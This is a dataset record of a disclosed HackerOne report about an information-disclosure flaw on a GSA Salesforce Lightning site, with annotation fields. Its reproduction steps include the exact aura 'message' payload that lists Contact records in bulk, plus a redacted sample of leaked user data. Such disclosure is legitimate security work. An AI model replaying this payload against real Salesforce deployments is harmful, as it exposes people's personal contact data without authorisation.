{
    "reported_to": "U.S. General Services Administration",
    "reported_by": "rptl ",
    "title": "Registered users contact  information disclosure on salesforce lightning endpoint https://disposal.gsa.gov",
    "content": "\nHi,\nSample of the Information Disclosure is below. More records are attached -\u2588\u2588\u2588\n\"LastName\":\"\u2588\u2588\u2588\u2588\",\"FullNamec\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"Id\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"MailingStreet\":null,\"Activec\":false,\"Emailc\":null,\"LastModifiedBy\":{\"Id\":\"00530000009KyDqAAK\",\"Name\":\"SNA \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"sobjectType\":\"User\"},\"UserPasswordc\":null,\"Officec\":null,\"BIA_Coordinatorc\":false,\"Contact_Typec\":null,\"MailingCountry\":null,\"Salutation\":null,\"MailingState\":null,\"OwnerId\":\"005t0000002H5O6AAK\",\"RecordType\":{\"Namel\":\"Non-Federal Contact\",\"Id\":\"\u2588\u2588\u2588\u2588\",\"Name\":\"Non-Federal Contact\",\"sobjectType\":\"RecordType\"},\"Phone\":\"\u2588\u2588\u2588\"\nUser\",\"sobjectType\":\"User\"},\"AccountId\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\",\"Email\":\"\u2588\u2588\u2588\u2588\u2588\",\"Subscription_Typec\":null,\"THPO_Coordinatorc\":false,\"MobilePhone\":null,\"Do_Not_Callc\":false,Name\":\"\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588,\"Regionc\":null,\"LastModifiedDatef\":\"5/12/2019 8:49 AM\",\"CreatedById\":\"005t0000001FpB7AAK\",\"Subscriberc\":false,\"Statec\":null,\"CreatedBy\":{\"Id\":\"005t0000001FpB7AAK\",\"Name\":\"Property Disposal Site Guest User\",\"sobjectType\":\"User\"},\"Section_7_Coordinatorc\":false,\"Environmental_Assessorc\":false,\"MailingCity\":null,\"Salutationl\":null,\"CreatedDatef\":\"1/24/2018 1:22 AM\",\"Commentsc\":null,\"CreatedDate\":\"2018-01-24T06:22:57.000Z\",\"Divisionc\":null,\"LastName\":\"\u2588\u2588\u2588\u2588\",\"FullNamec\":\"\u2588\u2588\u2588\u2588\"\nSteps to Reproduce -\n1) Create user account on https://disposal.gsa.gov\n2) Complete to account verification process.\n3) After login, visit the burp history and look for any any POST request having \"/s/sfsites/aura\" kind of request.\n4) Use the POST request like this \u2588\u2588\u2588\u2588\u2588 in repeater and modify \"message\" parameter as below and leave remaining aura.context and aura.token parameters as it is.\nmessage={\"actions\":[{\"id\":\"261;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"Contact\",\"pageSize\":1000,\"currentPage\":1,\"getCount\":true,\"layoutType\":\"FULL\",\"enableRowActions\":true,\"useTimeout\":false}}]}\n5) contact details of users will be returned by the endpoint.\nImpact\nInformation disclosure.\n\n",
    "severity": [
        7.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "Information Disclosure"
    ],
    "screenshots": {},
    "disclosed_date": 1654510620,
    "report_url": "https://hackerone.com/reports/1443654",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Create user account on https://disposal.gsa.gov"
        ],
        [
            2,
            "Complete the account verification process."
        ],
        [
            3,
            "After login, visit the burp history and look for any POST request having '/s/sfsites/aura' kind of request."
        ],
        [
            4,
            "Use the POST request in repeater and modify 'message' parameter as provided in the report, leaving remaining aura.context and aura.token parameters as is."
        ],
        [
            5,
            "Contact details of users will be returned by the endpoint."
        ]
    ],
    "vuln_description": "The vulnerability is an information disclosure issue where an authenticated user can access contact details of other registered users by manipulating a POST request to the Salesforce Lightning endpoint. The attack involves modifying the 'message' parameter in a specific request to retrieve sensitive user data.",
    "reason": "The attack involves understanding the structure of Salesforce Lightning requests and knowing to modify the 'message' parameter in a specific way. While it requires some familiarity with the platform and tools like Burp Suite, the steps are straightforward once the initial setup is done.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}